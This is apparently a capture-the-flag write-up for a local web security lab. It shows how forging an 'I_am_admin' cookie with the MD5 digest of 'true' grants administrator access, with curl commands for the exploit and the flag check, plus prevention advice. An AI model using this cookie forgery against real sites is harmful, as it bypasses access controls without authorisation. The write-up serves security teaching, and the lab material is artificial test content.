# Cookies

## 1. Discovery

Inspect the site's cookies in the browser developer tools. The challenge uses a cookie named `I_am_admin`. Its value represents the text `false` as an MD5 digest. The browser sends this cookie with page requests, so test whether changing its value changes the server response.

## 2. Exploitation

Replace the cookie value with the MD5 digest of `true`, then request the homepage:

```bash
curl -s -i \
-H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' \
"http://127.0.0.1:8080/" \
| grep "Good Job"
```

Observed result: HTTP 200. The response HTML displays the challenge flag.

## 3. Technical Explanation

The application uses a client-controlled cookie to make an administrator decision. It accepts a predictable digest as the value. The value `b326b5062b2f0e69046810717534cb09` is the MD5 digest of `true`. MD5 does not encrypt the value or prove that the server created it. A user can calculate the digest and send it in the cookie.

## 4. Security Impact

An attacker can change the cookie and gain access to functions or data that the application protects with this administrator check. The client can edit cookies, so a cookie value alone cannot establish a user's role.

## 5. Prevention

Keep session and role data on the server. Store only a random session identifier in the cookie, and validate it on the server for each request. If the application must store data in a cookie, protect its integrity with a secure keyed signature and validate the signature on the server. Do not use MD5 for this purpose.

## 6. Flag Verification

Run the command from the repository root. It matches the response's `Good job! Flag :` text, extracts that value, and compares it with `mandatory/cookies/flag`:

```bash
curl -s \
-H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' \
"http://127.0.0.1:8080/" \
| grep -oE 'Good job! Flag : [a-f0-9]{64}' \
| grep -oE '[a-f0-9]{64}' \
| diff - mandatory/cookies/flag
```

An exit status of `0` means that the retrieved flag matches the saved flag. The address `127.0.0.1:8080` is our local VirtualBox port-forwarding address. Adjust it if the evaluation environment uses a different address or port.
